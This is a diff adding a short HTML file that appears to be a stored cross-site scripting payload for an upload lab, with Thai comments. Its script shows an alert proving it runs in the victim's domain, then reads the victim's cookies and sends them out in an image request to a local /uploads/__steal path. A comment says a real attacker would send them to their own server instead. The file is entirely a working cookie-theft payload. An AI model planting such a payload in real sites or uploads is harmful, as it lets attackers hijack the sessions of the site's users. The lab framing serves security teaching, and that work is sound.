@@ -1,0 +1,12 @@
+<!doctype html>
+<html><body>
+<h1>hacked</h1>
+<script>
+  // 1) พิสูจน์ว่าสคริปต์รันในโดเมนของเว็บเหยื่อจริง
+  alert('Stored XSS จากไฟล์ที่อัปโหลด! โดเมน = ' + document.domain);
+
+  // 2) อ่านคุกกี้ของเหยื่อแล้วส่งออกไป (ในแล็บส่งไปที่ /uploads/__steal)
+  //    ของจริงแฮกเกอร์จะส่งไปเซิร์ฟเวอร์ของตัวเอง
+  new Image().src = '/uploads/__steal?c=' + encodeURIComponent(document.cookie);
+</script>
+</body></html>
